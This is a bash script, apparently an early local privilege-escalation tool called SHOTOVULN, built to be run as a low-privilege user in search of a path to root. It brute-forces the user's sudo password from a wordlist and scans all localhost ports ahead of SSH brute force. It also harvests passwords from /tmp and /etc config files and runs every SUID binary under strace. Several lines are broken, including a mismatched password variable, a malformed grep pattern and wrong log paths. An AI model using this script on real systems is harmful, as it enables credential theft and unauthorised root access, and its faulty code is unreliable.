#!/bin/bash
# v0.0

echo "SHOTOVULN v0.00"
echo "Senseiiii *0* show me the path to R00T *o* !"
echo "Please run this script as low privilege user :]"
echo "";

currentuser=$(whoami);
echo "current user and privilege is: $currentuser";

# TODO make the script non interactive for exploitation purposes


echo "### 1. Auditing features-like paths to go to other privileges"

echo "Do you know your own password? Y/N"
read -r answer;

if [ "$answer" == "Y" ] ; then
echo "What can you do as sudo :] ?";
sudo -l; else
echo "Now bruteforcing the loggedin user password through simple loop";
while read -r mypass; do echo "$my_pass" | sudo -S id; done < wordlist.txt; fi

echo "Getting valid users for login";
validuser=$(grep -v '/false' /etc/passwd | grep -v '/nologin' | cut -d ':' -f1);

echo "Brute forcing local users via su, download / compile sucrack"
# wget
#./sucrack wordlist.txt

echo "Getting SSH permissions";
grep -niR --color permit /etc/ssh/sshd_config;

echo "Getting allow users if any in SSH config"
grep -niR --color allowusers /etc/ssh/sshd_config;

echo "Scanning localhost ports for SSH detection and brute force";
nc -z -v 127.0.0.1 1-65535;
echo "Select the SSH port";
#./sshpassscript.sh wordlist

#echo "Do we have access to dmesg and check privesc related information ?"
#dmesg;




echo -e "\n"
echo "### 2. Auditing file and folders permissions to privesc"

echo "Root owned files in non root owned directory, ie. non root user can replace root owned files"
for x in $(find /var -type f -user root 2>/dev/null -exec dirname {} + | sort -u); do (echo -n "$x is owned by " && stat -c %U "$x") | grep -v 'root'; done

echo "Writable directory in default PATH, ie. ..."
path=$(echo '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' | tr ':' ' ');


echo "Checking tmp files for passwords or secrets";
find /tmp/ -type f -size +0 -exec grep -i --color 'secret/|password/|' {} + 2>/dev/null;

echo "Saving writable folders for everyone, useful for next steps"
writable=$(find / -type d -perm /o+w 2>/dev/null);





echo -e "\n";
### https://www.pentestpartners.com/blog/exploiting-suid-executables/
echo "### 3. Auditing SUID and SUID operations in a dumb way ... ie no arguments provided to them."

echo "SGID folders writable by others, ie. other can get group rights by writing to it"
find / -type d -perm /g+s -perm /o+w -exec ls -alhd {} + 2>/dev/null;

echo "SUID folders writable by others, ie. other can get user rights by writing to it"
find / -type d -perm /u+s -perm /o+w -exec ls -alhd {} + 2>/dev/null;

echo "Test SUID conf files for error based info disclosure"
echo "[TO DO]";

echo "Generating SUID logs ... you might receive some pop ups and error message since we are starting all SUID binaries.";
mkdir -p ~/.shotologs;
for x in $(find / -perm /4000 2>/dev/null); do timeout 20s strace "$x" 2>~/.shotologs/$(basename "$x").stracelog 1>/dev/null; done;

echo "Relative path opening in suid binaries, ie. you can fool the suid binary to open arbitrary file."
grep -n 'open("\.' ~/.shotologs/* --color;
grep -n 'open(' ~/.shotologs/* | grep -v 'open("/';

echo "Environment variables used in suid binaries, ie. untrusted use of env variables."
grep -n --color "getenv(" logs/*;

echo "Exec used in suid binaries, ie. untrusted use of PATH potentialy."
grep -n --color execve logs/*;



echo "";

echo -e "\n"
echo "### 4. Specific edge cases which enable you to change privilege."

echo "Apache symlink test"
find / -name apache*.conf -exec echo {} + -exec grep -i symlink --color {} + 2>/dev/null;

echo "Pythonpath or environment var issues"
python -c "import sys; print '\n'.join(sys.path);"

# we might need to create a matrix of user privs
# user1 > user2 > user9 > group1 > rootgroup > root



echo ""
echo "### 5. Init.d script auditing"

echo "Usage of predictable or fixed files in a writable folder";
echo "$writable";
grep -n -R --color ' /tmp' /etc/init.d/*;




echo "### 6. Trying to file conf files including password and password reuse"
grep -v '^$\|^\s*\#' /etc/*.conf  | grep -i --color "password";
grep -v '^$\|^\s*\#' /etc/*/*.conf  | grep -i --color "password";
echo "Storing passwords found ..."
